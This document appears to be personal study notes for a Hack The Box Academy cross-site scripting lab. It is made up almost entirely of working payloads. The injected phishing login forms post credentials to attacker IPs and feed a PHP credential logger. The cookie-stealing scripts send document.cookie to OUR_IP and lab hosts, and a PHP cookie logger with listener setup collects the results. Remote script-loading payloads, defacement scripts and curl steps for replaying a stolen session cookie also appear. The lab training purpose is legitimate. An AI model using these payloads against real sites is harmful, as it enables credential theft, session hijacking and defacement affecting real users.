# Intro to XSS 

**Introduction**

**What is XSS**

**XSS Attacks**

**Types of XSS**


# Stored XSS 

**XSS Testing Payloads**

`<script>alert(window.origin)</script> <plaintext> <script>print()</script>`

**View Page Source**  
CTRL+U

**Injected HTML Evidence**

`<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script> </ul></ul>`

**Flag Payload**

<script>alert(document.cookie)</script>



# Reflected XSS 
**XSS Testing Payloads**

<script>alert(window.origin)</script>

**View Page Source**  
CTRL+U

**Developer Tools**  
CTRL+Shift+I  
Network

**Network Copy URL**  
Copy>Copy URL

**Injected HTML Evidence**

<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>

**Flag Payload**

<script>alert(document.cookie)</script>


# DOM XSS 

**Developer Tools**  
CTRL+Shift+I  
Network  
CTRL+SHIFT+C

**View Page Source**  
CTRL+U

**DOM Source**  
document.URL  
task=

**DOM Sink**  
document.getElementById("todo").innerHTML

**DOM XSS Payload**  
<img src="" onerror=alert(window.origin)>

**Flag Payload**  
```
<img src="" onerror=alert(document.cookie)>
```

```
<script>alert(document.cookie)</script>
```

# XSS Discovery 

**Automated Discovery Tools**  
Nessus  
Burp Pro  
ZAP

**XSStrike**  
[https://github.com/s0md3v/XSStrike.git](https://github.com/s0md3v/XSStrike.git)  
git clone [https://github.com/s0md3v/XSStrike.git](https://github.com/s0md3v/XSStrike.git)  
cd XSStrike  
pip install -r requirements.txt  
python xsstrike.py  
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"  
-u  
http://SERVER_IP:PORT/index.php?task=test

**Other XSS Discovery Tools**  
[https://github.com/rajeshmajumdar/BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)  
[https://github.com/epsylon/xsser](https://github.com/epsylon/xsser)

**Payload Lists**  
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)  
[https://github.com/payload-box/xss-payload-list](https://github.com/payload-box/xss-payload-list)

**Detected Payload Example**  
<HtMl%09onPoIntERENTER+=+confirm()>

**HTTP Headers Mentioned**  
Cookie  
User-Agent

**Courses Mentioned**  
[https://academy.hackthebox.com/course/preview/secure-coding-101-javascript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript)  
[https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection)


# Defacing 

**Defacement Elements**  
document.body.style.background  
document.body.background  
document.title  
DOM.innerHTML

**Background Color Payload**

<script>document.body.style.background = "#141d2b"</script>

**Background Image Payload**

<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

**Page Title Payload**

<script>document.title = 'HackTheBox Academy'</script>

**DOM Text Modification**  
document.getElementById("todo").innerHTML = "New Text"  
$("#todo").html('New Text');  
document.getElementsByTagName('body')[0].innerHTML = "New Text"

**Defacement HTML**

<center> <h1 style="color: white">Cyber Security Training</h1> <p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p> </center>

**Final Defacement Payload**

<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>


# XSS Phishing 

**Target Paths**  
/phishing  
/phishing/send.php  
/phishing/login.php

**XSS Payload (Discovery Example)**  
`"><script>alert(window.origin)</script>`

**Injected HTML Login Form**

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
<input type="username" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" name="submit" value="Login">
</form>
```



**Injected JavaScript (Login Form)**

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

**DOM Cleanup JavaScript**

```javascript
document.getElementById('urlform').remove();
```

**Final XSS JavaScript Payload**

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```


```js
document.write('<h3>Please login to continue</h3><form action="http://YOUR_IP:80/"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

```js
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.7:4444/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--   
```

**HTML Comment Truncation**

```html
<!--
```

**Netcat Listener**

```bash
sudo nc -lvnp 80
```

**Captured Credential Pattern**

```
/?username=test&password=test&submit=Login
```

**PHP Credential Logger**

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```php
<?php if (isset($_GET['username']) && isset($_GET['password'])) { $file = fopen("creds.txt", "a+"); fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n"); header("Location: http://10.10.15.7/phishing/index.php"); fclose($file); exit(); } ?>
```
**PHP Server Setup**

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php
sudo php -S 0.0.0.0:80
```

**Credential File**

```bash
cat creds.txt
```

http://10.129.8.71/phishing/index.php?url=x%22onerror%3D%22document.getElementById%28%27urlform%27%29.style.display%3D%27none%27%3Bdocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.27%3A8080%3E%3Cinput+type%3Dusername+name%3Dusername+placeholder%3DUsername%3E%3Cinput+type%3Dpassword+name%3Dpassword+placeholder%3DPassword%3E%3Cinput+type%3Dsubmit+value%3DLogin%3E%3C%2Fform%3E%27%29%3B%22


# Session Hijacking 

**REMOTE SCRIPT INJECTION PAYLOADS**

```html
<script src="http://OUR_IP/script.js"></script>
```

```html
<script src="http://OUR_IP/username"></script>
```

```html
<script src=http://OUR_IP></script>
```

```html
'><script src=http://OUR_IP></script>
```

```html
"><script src=http://OUR_IP></script>
```

```html
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
```

```html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```

```html
<script>$.getScript("http://OUR_IP")</script>
```

```html
<script src=http://OUR_IP/fullname></script>
```

<script src=http://10.10.15.147/fullname></script>
<script src=http://10.10.15.147/password></script>
```html
<script src=http://OUR_IP/username></script>
```

```
'><script src=http://10.10.15.147:8080/test></script>
"><script src=http://10.10.15.147:8080/test></script>
```

```
'><script src=http://10.10.15.147:8080/script.js></script>
```

**LISTENER SETUP**

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

**COOKIE STEALING PAYLOADS**

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

```javascript
document.location='http://10.10.15.147/index.php?c='+document.cookie;
```

10.10.15.147
**SCRIPT.JS**

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

**XSS PAYLOAD WITH SCRIPT**

```html
<script src=http://OUR_IP/script.js></script>
```

**COOKIE LOGGER (PHP)** index.php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```php
<?php  
if (isset($_GET['c'])) {  
	$list = explode(";", $_GET['c']);  
	foreach ($list as $key => $value) {  
		$cookie = urldecode($value);  
		$file = fopen("cookies.txt", "a+");  
		fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");  
		fclose($file);  
}  
}  
?>
```

```js
'><script src=http://10.10.15.147:8080/script.js></script>
"><script src=http://10.10.15.147:8080/script.js></script>
```

```
curl -H "Cookie: cookie=c00k1355h0u1d8353cu23d" http://10.129.234.166/hijacking/login.php
```

### Method 1: Browser DevTools (Firefox/Chrome)

1. Go to `http://10.129.234.166/hijacking/login.php`
2. F12 → Storage tab (or Application in Chrome)
3. Cookies → `http://10.129.234.166`
4. Right-click → Add cookie OR click +
    - Name: `cookie`
    - Value: `c00k1355h0u1d8353cu23d`
    - Domain: `.129.234.166` (or leave default)
    - Path: `/hijacking`
5. Refresh page → FLAG appears!

### Method 2: cURL (if no storage tab)

bash

```
curl -H "Cookie: cookie=c00k1355h0u1d8353cu23d" http://10.129.234.166/hijacking/login.php
```

### Method 3: Browser Extension (easiest)

- Install Cookie Editor extension
- Add cookie: `cookie=c00k1355h0u1d8353cu23d`
- Navigate to login.php



#
#
#
#